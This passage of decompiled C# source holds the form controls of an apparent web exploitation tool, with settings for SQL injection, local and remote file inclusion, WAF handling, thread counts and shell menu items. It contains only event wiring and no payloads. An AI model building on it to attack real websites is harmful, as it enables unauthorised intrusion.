	internal virtual ToolStripStatusLabel lblDownloads
	{
		[CompilerGenerated]
		get
		{
			return _lblDownloads;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = method_210;
			ToolStripStatusLabel toolStripStatusLabel = _lblDownloads;
			if (toolStripStatusLabel != null)
			{
				toolStripStatusLabel.MouseDown -= value2;
			}
			_lblDownloads = value;
			toolStripStatusLabel = _lblDownloads;
			if (toolStripStatusLabel != null)
			{
				toolStripStatusLabel.MouseDown += value2;
			}
		}
	}

	internal virtual ContextMenuStrip mnuQueue
	{
		[CompilerGenerated]
		get
		{
			return _mnuChecked_4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			CancelEventHandler value2 = method_151;
			ContextMenuStrip mnuChecked_ = _mnuChecked_4;
			if (mnuChecked_ != null)
			{
				mnuChecked_.Opening -= value2;
			}
			_mnuChecked_4 = value;
			mnuChecked_ = _mnuChecked_4;
			if (mnuChecked_ != null)
			{
				mnuChecked_.Opening += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuQueueClipboard
	{
		[CompilerGenerated]
		get
		{
			return _mnuQueueClipboard;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_153;
			ToolStripMenuItem toolStripMenuItem = _mnuQueueClipboard;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuQueueClipboard = value;
			toolStripMenuItem = _mnuQueueClipboard;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuQueueSelectAll
	{
		[CompilerGenerated]
		get
		{
			return _mnuQueueSelectAll;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_154;
			ToolStripMenuItem toolStripMenuItem = _mnuQueueSelectAll;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuQueueSelectAll = value;
			toolStripMenuItem = _mnuQueueSelectAll;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("mnuQueueSP2")]
	internal virtual ToolStripSeparator mnuQueueSP2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem mnuQueueRomove
	{
		[CompilerGenerated]
		get
		{
			return _mnuQueueRomove;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_155;
			ToolStripMenuItem toolStripMenuItem = _mnuQueueRomove;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuQueueRomove = value;
			toolStripMenuItem = _mnuQueueRomove;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuQueueShell
	{
		[CompilerGenerated]
		get
		{
			return _mnuQueueShell;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_152;
			ToolStripMenuItem toolStripMenuItem = _mnuQueueShell;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuQueueShell = value;
			toolStripMenuItem = _mnuQueueShell;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ListBox lstExcludeUrlWords
	{
		[CompilerGenerated]
		get
		{
			return _lstExcludeUrlWords;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_114;
			ListBox listBox = _lstExcludeUrlWords;
			if (listBox != null)
			{
				listBox.Leave -= value2;
			}
			_lstExcludeUrlWords = value;
			listBox = _lstExcludeUrlWords;
			if (listBox != null)
			{
				listBox.Leave += value2;
			}
		}
	}

	[field: AccessedThroughProperty("lblSkipWordURL")]
	internal virtual Label lblSkipWordURL
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button btnExcludeUrlWords
	{
		[CompilerGenerated]
		get
		{
			return _btnExcludeUrlWords;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_116;
			Button button = _btnExcludeUrlWords;
			if (button != null)
			{
				button.Click -= value2;
			}
			_btnExcludeUrlWords = value;
			button = _btnExcludeUrlWords;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("mnuExcludeUrlWords")]
	internal virtual ContextMenuStrip mnuExcludeUrlWords
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem mnuExcludeUrlWordsRemove
	{
		[CompilerGenerated]
		get
		{
			return _mnuExcludeUrlWordsRemove;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_117;
			ToolStripMenuItem toolStripMenuItem = _mnuExcludeUrlWordsRemove;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuExcludeUrlWordsRemove = value;
			toolStripMenuItem = _mnuExcludeUrlWordsRemove;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("lblSearchSummary_2")]
	internal virtual Label lblSearchSummary_2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("tsFileInclusao")]
	internal virtual ToolStrip tsFileInclusao
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("cmbFileInclusaoSearch")]
	internal virtual ToolStripComboBox cmbFileInclusaoSearch
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripButton btnFileInclusaoSearchClear
	{
		[CompilerGenerated]
		get
		{
			return _btnFileInclusaoSearchClear;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_172;
			ToolStripButton toolStripButton = _btnFileInclusaoSearchClear;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= value2;
			}
			_btnFileInclusaoSearchClear = value;
			toolStripButton = _btnFileInclusaoSearchClear;
			if (toolStripButton != null)
			{
				toolStripButton.Click += value2;
			}
		}
	}

	internal virtual ToolStripButton btnFileInclusaoSearch
	{
		[CompilerGenerated]
		get
		{
			return _btnFileInclusaoSearch;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_172;
			ToolStripButton toolStripButton = _btnFileInclusaoSearch;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= value2;
			}
			_btnFileInclusaoSearch = value;
			toolStripButton = _btnFileInclusaoSearch;
			if (toolStripButton != null)
			{
				toolStripButton.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("lblFileInclusao")]
	internal virtual ToolStripLabel lblFileInclusao
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblSQLiNoInjectCount")]
	internal virtual ToolStripSeparator lblSQLiNoInjectCount
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblLFIPathCount")]
	internal virtual Label lblLFIPathCount
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual VisualStyler VisualStyler1
	{
		[CompilerGenerated]
		get
		{
			return visualStyler_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			visualStyler_0 = value;
		}
	}

	[field: AccessedThroughProperty("GroupBox4")]
	internal virtual GroupBox GroupBox4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("grbExploithing")]
	internal virtual GroupBox grbExploithing
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("GroupBox1")]
	internal virtual GroupBox GroupBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("pnlSettingsAdvanced")]
	internal virtual Panel pnlSettingsAdvanced
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("grbRFI")]
	internal virtual GroupBox grbRFI
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("grbLfiLinux")]
	internal virtual GroupBox grbLfiLinux
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblRFIurl")]
	internal virtual Label lblRFIurl
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual TextBox txtRFIurl
	{
		[CompilerGenerated]
		get
		{
			return _txtRFIurl;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_110;
			TextBox textBox = _txtRFIurl;
			if (textBox != null)
			{
				textBox.TextChanged -= value2;
			}
			_txtRFIurl = value;
			textBox = _txtRFIurl;
			if (textBox != null)
			{
				textBox.TextChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("lblRFIkeyword")]
	internal virtual Label lblRFIkeyword
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual TextBox txtRFIkeyword
	{
		[CompilerGenerated]
		get
		{
			return _txtRFIkeyword;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_110;
			TextBox textBox = _txtRFIkeyword;
			if (textBox != null)
			{
				textBox.TextChanged -= value2;
			}
			_txtRFIkeyword = value;
			textBox = _txtRFIkeyword;
			if (textBox != null)
			{
				textBox.TextChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("lblAdvanced")]
	internal virtual Label lblAdvanced
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtNotepad")]
	internal virtual TextBox txtNotepad
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ContextMenuStrip mnuTrash
	{
		[CompilerGenerated]
		get
		{
			return _mnuChecked_5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			CancelEventHandler value2 = method_143;
			ContextMenuStrip mnuChecked_ = _mnuChecked_5;
			if (mnuChecked_ != null)
			{
				mnuChecked_.Opening -= value2;
			}
			_mnuChecked_5 = value;
			mnuChecked_ = _mnuChecked_5;
			if (mnuChecked_ != null)
			{
				mnuChecked_.Opening += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuTrashClippboard
	{
		[CompilerGenerated]
		get
		{
			return _mnuTrashClippboard;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_145;
			ToolStripMenuItem toolStripMenuItem = _mnuTrashClippboard;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuTrashClippboard = value;
			toolStripMenuItem = _mnuTrashClippboard;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuTrashSelectAll
	{
		[CompilerGenerated]
		get
		{
			return _mnuTrashSelectAll;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_146;
			ToolStripMenuItem toolStripMenuItem = _mnuTrashSelectAll;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuTrashSelectAll = value;
			toolStripMenuItem = _mnuTrashSelectAll;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ToolStripSeparator8")]
	internal virtual ToolStripSeparator ToolStripSeparator8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem mnuTrashClearAll
	{
		[CompilerGenerated]
		get
		{
			return _mnuTrashClearAll;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_147;
			ToolStripMenuItem toolStripMenuItem = _mnuTrashClearAll;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuTrashClearAll = value;
			toolStripMenuItem = _mnuTrashClearAll;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ToolStripSeparator10")]
	internal virtual ToolStripSeparator ToolStripSeparator10
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem mnuTrashRemove
	{
		[CompilerGenerated]
		get
		{
			return _mnuTrashRemove;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_148;
			ToolStripMenuItem toolStripMenuItem = _mnuTrashRemove;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuTrashRemove = value;
			toolStripMenuItem = _mnuTrashRemove;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ToolStripSeparator11")]
	internal virtual ToolStripSeparator ToolStripSeparator11
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("mnuTrashCount")]
	internal virtual ToolStripMenuItem mnuTrashCount
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ComboBox cmbGUIHotKey
	{
		[CompilerGenerated]
		get
		{
			return _cmbGUIHotKey;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_6;
			ComboBox comboBox = _cmbGUIHotKey;
			if (comboBox != null)
			{
				comboBox.SelectedIndexChanged -= value2;
			}
			_cmbGUIHotKey = value;
			comboBox = _cmbGUIHotKey;
			if (comboBox != null)
			{
				comboBox.SelectedIndexChanged += value2;
			}
		}
	}

	internal virtual CheckBox chkGUIHotKey
	{
		[CompilerGenerated]
		get
		{
			return _chkGUIHotKey;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_5;
			CheckBox checkBox = _chkGUIHotKey;
			if (checkBox != null)
			{
				checkBox.CheckedChanged -= value2;
			}
			_chkGUIHotKey = value;
			checkBox = _chkGUIHotKey;
			if (checkBox != null)
			{
				checkBox.CheckedChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("chkSysTray")]
	internal virtual CheckBox chkSysTray
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual NotifyIcon ntfTray
	{
		[CompilerGenerated]
		get
		{
			return notifyIcon_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_4;
			EventHandler value3 = method_4;
			NotifyIcon notifyIcon = notifyIcon_0;
			if (notifyIcon != null)
			{
				notifyIcon.Click -= value2;
				notifyIcon.BalloonTipClicked -= value3;
			}
			notifyIcon_0 = value;
			notifyIcon = notifyIcon_0;
			if (notifyIcon != null)
			{
				notifyIcon.Click += value2;
				notifyIcon.BalloonTipClicked += value3;
			}
		}
	}

	[field: AccessedThroughProperty("grbAppSetthings")]
	internal virtual GroupBox grbAppSetthings
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button btnSettingSave
	{
		[CompilerGenerated]
		get
		{
			return _btnSettingSave;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_69;
			Button button = _btnSettingSave;
			if (button != null)
			{
				button.Click -= value2;
			}
			_btnSettingSave = value;
			button = _btnSettingSave;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	internal virtual Button btnSettingReLoad
	{
		[CompilerGenerated]
		get
		{
			return _btnSettingReLoad;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_70;
			Button button = _btnSettingReLoad;
			if (button != null)
			{
				button.Click -= value2;
			}
			_btnSettingReLoad = value;
			button = _btnSettingReLoad;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	internal virtual Button btnSettingReset
	{
		[CompilerGenerated]
		get
		{
			return _btnSettingReset;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_71;
			Button button = _btnSettingReset;
			if (button != null)
			{
				button.Click -= value2;
			}
			_btnSettingReset = value;
			button = _btnSettingReset;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	internal virtual CheckedListBox lstExpoitType
	{
		[CompilerGenerated]
		get
		{
			return _lstExpoitType;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			ItemCheckEventHandler value2 = method_112;
			EventHandler value3 = method_113;
			CheckedListBox checkedListBox = _lstExpoitType;
			if (checkedListBox != null)
			{
				checkedListBox.ItemCheck -= value2;
				checkedListBox.Leave -= value3;
			}
			_lstExpoitType = value;
			checkedListBox = _lstExpoitType;
			if (checkedListBox != null)
			{
				checkedListBox.ItemCheck += value2;
				checkedListBox.Leave += value3;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuTrashRefresh
	{
		[CompilerGenerated]
		get
		{
			return _mnuTrashRefresh;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_144;
			ToolStripMenuItem toolStripMenuItem = _mnuTrashRefresh;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuTrashRefresh = value;
			toolStripMenuItem = _mnuTrashRefresh;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ToolStripSeparator1")]
	internal virtual ToolStripSeparator ToolStripSeparator1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblHTTPdelay")]
	internal virtual Label lblHTTPdelay
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem mnuHttpLogDock
	{
		[CompilerGenerated]
		get
		{
			return _mnuHttpLogDock;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_208;
			ToolStripMenuItem toolStripMenuItem = _mnuHttpLogDock;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuHttpLogDock = value;
			toolStripMenuItem = _mnuHttpLogDock;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("numHTTPTimeout")]
	internal virtual NumericUpDown numHTTPTimeout
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("numHTTPRetry")]
	internal virtual NumericUpDown numHTTPRetry
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual NumericUpDown numThreads
	{
		[CompilerGenerated]
		get
		{
			return _numThreads;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_97;
			NumericUpDown numericUpDown = _numThreads;
			if (numericUpDown != null)
			{
				numericUpDown.ValueChanged -= value2;
			}
			_numThreads = value;
			numericUpDown = _numThreads;
			if (numericUpDown != null)
			{
				numericUpDown.ValueChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("numScanningDelay")]
	internal virtual NumericUpDown numScanningDelay
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("numLFIpathTraversalCount")]
	internal virtual NumericUpDown numLFIpathTraversalCount
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("numExploitingDelay")]
	internal virtual NumericUpDown numExploitingDelay
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lvwLFIpathLinux")]
	internal virtual ListViewExt lvwLFIpathLinux
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ColumnHeader ColumnHeader5
	{
		[CompilerGenerated]
		get
		{
			return columnHeader_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			columnHeader_0 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader7
	{
		[CompilerGenerated]
		get
		{
			return columnHeader_1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			columnHeader_1 = value;
		}
	}

	[field: AccessedThroughProperty("lvwLFIpathWin")]
	internal virtual ListViewExt lvwLFIpathWin
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ColumnHeader ColumnHeader8
	{
		[CompilerGenerated]
		get
		{
			return columnHeader_2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			columnHeader_2 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader9
	{
		[CompilerGenerated]
		get
		{
			return columnHeader_3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			columnHeader_3 = value;
		}
	}

	internal virtual ContextMenuStrip mnuPaths
	{
		[CompilerGenerated]
		get
		{
			return _mnuChecked_7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			CancelEventHandler value2 = method_124;
			ContextMenuStrip mnuChecked_ = _mnuChecked_7;
			if (mnuChecked_ != null)
			{
				mnuChecked_.Opening -= value2;
			}
			_mnuChecked_7 = value;
			mnuChecked_ = _mnuChecked_7;
			if (mnuChecked_ != null)
			{
				mnuChecked_.Opening += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuPathAdd
	{
		[CompilerGenerated]
		get
		{
			return _mnuPathAdd;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_125;
			ToolStripMenuItem toolStripMenuItem = _mnuPathAdd;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuPathAdd = value;
			toolStripMenuItem = _mnuPathAdd;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuPathEdit
	{
		[CompilerGenerated]
		get
		{
			return _mnuPathEdit;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_126;
			ToolStripMenuItem toolStripMenuItem = _mnuPathEdit;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuPathEdit = value;
			toolStripMenuItem = _mnuPathEdit;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuPathRem
	{
		[CompilerGenerated]
		get
		{
			return _mnuPathRem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_127;
			ToolStripMenuItem toolStripMenuItem = _mnuPathRem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuPathRem = value;
			toolStripMenuItem = _mnuPathRem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("grbFileIncWAFs")]
	internal virtual GroupBox grbFileIncWAFs
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("grbHTTPExploit")]
	internal virtual GroupBox grbHTTPExploit
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("chkExploitIgnoreCookies")]
	internal virtual CheckBox chkExploitIgnoreCookies
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("chkSkipHttpStatus4xx")]
	internal virtual CheckBox chkSkipHttpStatus4xx
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("tsWorker")]
	internal virtual ToolStrip tsWorker
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("btnStart")]
	internal virtual ToolStripButton btnStart
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("btnPause")]
	internal virtual ToolStripButton btnPause
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("btnPauseSP")]
	internal virtual ToolStripSeparator btnPauseSP
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("btnStop")]
	internal virtual ToolStripButton btnStop
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("prbMainStatus")]
	internal virtual ToolStripProgressBar prbMainStatus
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual CheckBox chkLfiWindowsSkip
	{
		[CompilerGenerated]
		get
		{
			return _chkLfiWindowsSkip;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_111;
			CheckBox checkBox = _chkLfiWindowsSkip;
			if (checkBox != null)
			{
				checkBox.CheckedChanged -= value2;
			}
			_chkLfiWindowsSkip = value;
			checkBox = _chkLfiWindowsSkip;
			if (checkBox != null)
			{
				checkBox.CheckedChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("lvwWafs")]
	internal virtual ListViewExt lvwWafs
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ColumnHeader ColumnHeader11
	{
		[CompilerGenerated]
		get
		{
			return columnHeader_4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			columnHeader_4 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader12
	{
		[CompilerGenerated]
		get
		{
			return columnHeader_5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			columnHeader_5 = value;
		}
	}

	[field: AccessedThroughProperty("lblUserAgent")]
	internal virtual Label lblUserAgent
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual TextBox txtUserAgent
	{
		[CompilerGenerated]
		get
		{
			return _txtUserAgent;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_91;
			TextBox textBox = _txtUserAgent;
			if (textBox != null)
			{
				textBox.Leave -= value2;
			}
			_txtUserAgent = value;
			textBox = _txtUserAgent;
			if (textBox != null)
			{
				textBox.Leave += value2;
			}
		}
	}

	[field: AccessedThroughProperty("lblAccept")]
	internal virtual Label lblAccept
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual TextBox txtAccept
	{
		[CompilerGenerated]
		get
		{
			return _txtAccept;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_92;
			TextBox textBox = _txtAccept;
			if (textBox != null)
			{
				textBox.Leave -= value2;
			}
			_txtAccept = value;
			textBox = _txtAccept;
			if (textBox != null)
			{
				textBox.Leave += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuLWShell
	{
		[CompilerGenerated]
		get
		{
			return _mnuLWShell;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_159;
			ToolStripMenuItem toolStripMenuItem = _mnuLWShell;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuLWShell = value;
			toolStripMenuItem = _mnuLWShell;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("grbSQLi")]
	internal virtual GroupBox grbSQLi
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual NumericUpDown numAnalizerUnionEnd
	{
		[CompilerGenerated]
		get
		{
			return _numAnalizerUnionEnd;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_95;
			NumericUpDown numericUpDown = _numAnalizerUnionEnd;
			if (numericUpDown != null)
			{
				numericUpDown.ValueChanged -= value2;
			}
			_numAnalizerUnionEnd = value;
			numericUpDown = _numAnalizerUnionEnd;
			if (numericUpDown != null)
			{
				numericUpDown.ValueChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("lblSQLiUnionTo")]
	internal virtual Label lblSQLiUnionTo
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual NumericUpDown numAnalizerUnionSart
	{
		[CompilerGenerated]
		get
		{
			return _numAnalizerUnionSart;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_95;
